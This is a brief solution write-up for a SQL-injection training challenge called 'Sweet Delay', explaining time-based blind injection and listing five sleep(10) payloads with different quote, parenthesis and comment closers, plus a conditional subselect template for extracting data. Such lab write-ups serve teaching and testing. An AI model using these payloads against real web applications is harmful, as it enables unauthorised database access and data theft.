Solutions of Sweet Delay challenge (SQL Ninja):
(Reference: http://www.securityidiots.com/Web-Pentest/SQL-Injection/time-based-blind-injection.html)

For these challenge, we see that when we add characters at the end of url, we don't see any differnces in the screen. So we can only try time-based injection.
Hence, do following steps:
+ Find <special_characters> and <comment_characters> such that:
...?id=1<special_characters> and sleep(10)<comment_characters> 
get delay in page loading (NOTE: we need to refresh mutiple times to make sure it is delay or not)
+ Get information by using format:
...?id=1<special_characters> and (select sleep(10) from dual where (<SQL query returns single row>) <comment_characters>)
if SQL query returns false, we cannot get delay and otherwise.
For details of SQL query to get information, see blindluck.txt

Answer:
#1. ...?id=1 and sleep(10) --+-
#2. ...?id=1' and sleep(10) --+-
#3. ...?id=1" and sleep(10) --+-
#4. ...?id=1) and sleep(10) --+-
#5. ...?id=1") and sleep(10) --+-
